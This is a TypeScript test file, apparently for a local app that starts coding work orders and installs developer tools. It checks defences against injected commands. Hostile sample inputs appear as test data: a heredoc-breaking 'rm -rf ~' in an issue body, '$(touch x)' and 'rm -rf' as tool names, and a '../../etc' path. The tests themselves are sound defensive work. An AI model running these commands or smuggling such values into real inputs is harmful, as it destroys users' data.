		store.saveIssues("fairway", [{ ...OUTSIDER, body: "x\nPROMPT\nrm -rf ~" }]);
		const res = await post("/api/work-orders/command", {
			project: "fairway",
			type: "Bug fix",
			description: "x",
			source: { kind: "issue", fingerprint: "issue:fairway:5" },
		});
		const { command } = await res.json();
		expect(command).toContain("<<'PROMPT_2'");
		expect(command).toContain('<untrusted-data source="issue">');
	});
});

describe("improve yourself", () => {
	const post = (path: string, data: unknown) =>
		app.request(path, { method: "POST", headers: SESSION, body: JSON.stringify(data) });
	const insert = (slug: string, repo: string, isPrivate: number, path: string | null) =>
		store.db
			.prepare(
				"INSERT INTO projects (slug, repo, name, url, is_private, local_path, added_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
			)
			.run(slug, repo, slug, `https://github.com/${repo}`, isPrivate, path, "2026-11-01T00:00:00Z");
	const add = () => insert("software-factory", "me/software-factory", 0, dir);

	it("adds the factory's own repo when it isn't in yet, and starts a work order on it", async () => {
		const res = await post("/api/improve", { type: "Bug", text: "The Close button reports twice" });
		expect(res.status).toBe(200);
		const { id } = (await res.json()) as { id: number };
		const order = store.workOrder(id);
		expect(order?.project).toBe(store.projects().find((p) => p.repo === "me/software-factory")?.slug);
		expect(order?.type).toBe("Bug fix");
		expect(order?.title).toBe("The Close button reports twice");
	});

	it("an improvement is a feature", async () => {
		const res = await post("/api/improve", { type: "Improvement", text: "Filter issues" });
		const { id } = (await res.json()) as { id: number };
		expect(store.workOrder(id)?.type).toBe("Feature");
	});

	it("holds text that names something private until it's confirmed", async () => {
		add();
		const text = `Broken at ${homedir()}/somewhere`;
		const before = store.workOrders().length;
		const res = await post("/api/improve", { type: "Bug", text });
		expect(res.status).toBe(409);
		expect(store.workOrders()).toHaveLength(before);
		const command = await post("/api/improve/command", { type: "Bug", text });
		expect(command.status).toBe(409);
		const check = (await (await post("/api/improve/check", { text })).json()) as { hits: string[] };
		expect(check.hits).toContain(homedir());
		expect((await post("/api/improve", { type: "Bug", text, confirmed: true })).status).toBe(200);
	});

	it("names private projects and never-touch rules", async () => {
		insert("quiet-thing", "me/quiet-thing", 1, null);
		writeNeverTouch(dir, ["client-*"]);
		const check = async (text: string) =>
			((await (await post("/api/improve/check", { text })).json()) as { hits: string[] }).hits;
		expect(await check("copy it from quiet-thing")).toContain("quiet-thing");
		expect(await check("as in client today")).toContain("client");
		expect(await check("Filter issues")).toEqual([]);
	});

	it("copies a command that uses the same text", async () => {
		add();
		const res = await post("/api/improve/command", { type: "Improvement", text: "Filter issues" });
		const { command } = (await res.json()) as { command: string };
		expect(command).toContain("t3 thread start");
		expect(command).toContain("Filter issues");
	});

	it("needs something to say", async () => {
		expect((await post("/api/improve", { type: "Bug", text: "  " })).status).toBe(400);
	});
});

describe("versions", () => {
	const post = (path: string, data: unknown) =>
		app.request(path, { method: "POST", headers: SESSION, body: JSON.stringify(data) });
	it("a checkout reports no versions to switch", async () => {
		const res = await app.request("/api/versions", { headers: HOST });
		const data = (await res.json()) as VersionsResponse;
		expect(data).toMatchObject({
			mode: "checkout",
			running: null,
			repo: "me/software-factory",
			building: [],
		});
	});

	it("reports the version without a session, so the guard can read it", async () => {
		const res = await app.request("/api/version", { headers: HOST });
		expect(res.status).toBe(200);
		expect(await res.json()).toEqual({ sha: null });
	});

	it("switching needs a session", async () => {
		const res = await app.request("/api/versions/activate", {
			method: "POST",
			headers: { ...HOST, "content-type": "application/json" },
			body: JSON.stringify({ sha: "a".repeat(40) }),
		});
		expect(res.status).toBe(403);
	});

	it("a checkout refuses to switch", async () => {
		expect((await post("/api/versions/activate", { sha: "a".repeat(40) })).status).toBe(409);
	});

	it("rejects something that isn't a sha", async () => {
		expect((await post("/api/versions/activate", { sha: "../../etc" })).status).toBe(400);
	});
});

describe("setting up a new Mac", () => {
	const post = (path: string, data: unknown = {}) =>
		app.request(path, { method: "POST", headers: SESSION, body: JSON.stringify(data) });
	const insert = (path: string | null) =>
		store.db
			.prepare("INSERT INTO projects (slug, repo, name, url, local_path, added_at) VALUES (?, ?, ?, ?, ?, ?)")
			.run("ledger", "me/ledger", "Ledger", "https://github.com/me/ledger", path, "2026-11-01T00:00:00Z");

	it("installs with the listed command", async () => {
		expect((await post("/api/tools/install", { name: "infisical" })).status).toBe(200);
		expect(calls).toContainEqual(expect.stringMatching(/^brew install infisical/));
	});

	it("runs nothing for a name it doesn't know", async () => {
		const before = calls.length;
		expect((await post("/api/tools/install", { name: "rm -rf" })).status).toBe(404);
		expect((await post("/api/tools/sign-in", { name: "$(touch x)" })).status).toBe(404);
		expect(calls).toHaveLength(before);
	});

	it("opens the listed login in Terminal", async () => {
		expect((await post("/api/tools/sign-in", { name: "gh" })).status).toBe(200);
		const line = calls.find((c) => c.startsWith("osascript"));
		expect(line).toContain('do script "gh auth login"');
	});

	it("says what's missing when a tool has no sign-in", async () => {
		expect((await post("/api/tools/sign-in", { name: "t3" })).status).toBe(502);
		expect(calls.some((c) => c.startsWith("osascript"))).toBe(false);
	});

	it("doesn't take another install while one runs", async () => {
		const first = post("/api/tools/install", { name: "infisical" });
		const second = await post("/api/tools/install", { name: "wrangler" });
		expect(second.status).toBe(409);
		expect((await first).status).toBe(200);
	});

	it("needs a session", async () => {
		const res = await app.request("/api/tools/install", {
			method: "POST",
			headers: { ...HOST, "content-type": "application/json" },
			body: JSON.stringify({ name: "gh" }),
		});
		expect(res.status).toBe(403);
	});

	it("clones a path from another Mac into this Mac's clone folder", async () => {
		insert("/Users/someone-else/code/ledger");
		expect((await post("/api/projects/ledger/clone")).status).toBe(200);
		const path = store.project("ledger")?.localPath ?? "";
		expect(path).not.toContain("someone-else");
		expect(path.endsWith("/ledger")).toBe(true);
	});

	it("finishing clears the flag", async () => {
		kvSet(store.db, "new_device", true);
		const shell = async () =>
			((await (await app.request("/api/shell", { headers: HOST })).json()) as ShellResponse).newDevice;
		expect(await shell()).toBe(true);
		await post("/api/new-device/done");
		expect(await shell()).toBe(false);
	});
});
